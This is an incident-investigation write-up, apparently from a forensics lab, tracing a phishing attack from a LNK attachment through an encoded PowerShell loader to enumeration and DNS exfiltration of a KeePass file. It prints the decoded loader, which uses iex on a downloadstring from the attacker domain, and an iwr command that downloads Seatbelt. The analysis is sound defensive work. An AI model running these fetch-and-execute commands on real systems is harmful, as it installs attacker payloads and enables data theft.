1.0 Scenario Overview 

This investigation analyses a phishing-based compromise that resulted in malicious PowerShell execution, attacker-controlled activity, and data exfiltration from a Windows workstation. 
The attack began with a phishing email containing an encrypted attachment. Once executed, the attachment launched an encoded PowerShell command that established communication with attacker-controlled infrastructure and initiated a series of malicious activities on the victim machine.
Using PowerShell logs, packet capture analysis, and email artefacts, the investigation reconstructed the attacker’s actions, including tool downloads, system enumeration, sensitive file access, and outbound data transfers. 
The objective of this investigation was to identify how the compromise occurred, trace the attacker’s activity across the system and network, and determine the overall impact of the intrusion. 2. Investigation Flow 
2.1.0 Intial Access (Phishing Email Execution Chain) 
The intrusion began with a phishing email delivered to the victim’s mailbox. The email contained a malicious attachment (invoice.zip) encrypted & disguised to bypass basic email filtering and appear legitimate while executing hidden commands upon interaction. 
Evidence: Phishing Email (dump.eml) 

The file in invoice.zip was actually a LNK file that functioned as the execution trigger, initiating PowerShell-based payload delivery once the attachment was opened. 

Evidence: LNK file (lnkparseresults.png) 

Initial Access Summary: The phishing email delivered a malicious attachment which, upon execution, triggered a LNK-based launcher that initiated an encoded PowerShell command, marking the start of endpoint compromise. 

2.1.1 PowerShell Execution Analysis Encoded command (raw) This is a Base64-encoded PowerShell command using: 
**-nop **→ No Profile (avoids user scripts) 
**-windowstyle hidden** → hides execution window 
**-enc** → encoded command (obfuscation) 
## This is a classic execution evasion technique used in phishing-based attacks. 

2.1.2 Decoded command 
When decoded, the Base64 string becomes: iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update') 
1. iex Short for Invoke-Expression Executes whatever is returned.
2. new-object net.webclient Creates a web client object Used for network communication.
3. downloadstring() Downloads content from a remote server..
4.  Remote URL http://files.bpakcaging.xyz/update This is the attacker-controlled infrastructure Used to fetch second-stage payload


2.1.3 — Attack behavior classification

This is: ✔ Living-off-the-land technique Using built-in PowerShell tools instead of malware binaries 
         ✔ Remote payload execution (fileless) No file is saved — code runs directly in memory
         ✔ Stage 1 loader This is NOT the final payload — it fetches more malicious code
Summary 
The encoded PowerShell command indicates an attempt to execute a hidden script that retrieves and runs additional malicious content from an external attacker-controlled domain. The use of encoded execution parameters and hidden window style strongly suggests deliberate obfuscation to evade detection. 
2.3.0 Attacker Activity Analysis

Initial analysis confirmed that the malicious attachment led to execution of a PowerShell command on the compromised workstation, establishing the initial foothold.

The decoded payload identified the starting point of endpoint-level activity and provided the first indicator of attacker-controlled execution.

Following this, PowerShell operational logs were analysed to determine the scope and impact of the intrusion. The investigation focused on identifying the execution of the decoded payload and correlating it with subsequent malicious activity observed on the host.

Since the logs were structured in JSON format, they were parsed using jq, a lightweight command-line JSON processor, to enable efficient filtering and analysis of relevant events.
Analyis of powershell logs began with the domain identified in the decoded payload to reconstruct attacker behaiviour and extent of compromise.

Attacker Infrastructure Discovery

Analysis of the PowerShell logs revealed communication with multiple attacker-controlled domains used for payload hosting and command-and-control (C2) activity.

The following domains were identified:

Domain	Purpose
files.bpakcaging.xyz	Payload hosting and tool delivery
cdn.bpakcaging.xyz	Command-and-control communication

The malicious PowerShell commands showed repeated outbound HTTP requests to these domains, including remote script execution and payload retrieval activity.
![PowerShell C2 Traffic](screenshots/c2-domains.png)

### Enumeration Activity

Further analysis revealed that the attacker downloaded and executed **Seatbelt**, a well-known Windows enumeration tool commonly used for post-exploitation reconnaissance.

sb.png

The tool was retrieved from attacker-controlled infrastructure using PowerShell web requests: iwr http://files.bpakcaging.xyz/sb.exe -outfile sb.exe
This activity suggests the attacker was attempting to gather system and environment information following initial compromise.

### Sensitive File Access

PowerShell logs showed the attacker downloading and executing **sq3.exe**, a SQLite database interaction utility.
The tool was used to access the following SQLite database associated with Microsoft Sticky Notes:
Associated command observed:

sq3.png

This indicates the attacker was attempting to extract locally stored user information from the Sticky Notes application database.

### Data Exfiltration Activity

Analysis of PowerShell telemetry identified attempted exfiltration of a sensitive KeePass password database file: protected_data.kdbx
The attacker used PowerShell to read the file contents into memory before converting the data into hexadecimal format for outbound transmission.

Observed commands indicated the use of **nslookup** to transmit encoded data through DNS queries:

exfil.png

This behaviour is consistent with DNS-based data exfiltration techniques designed to bypass traditional network monitoring controls.


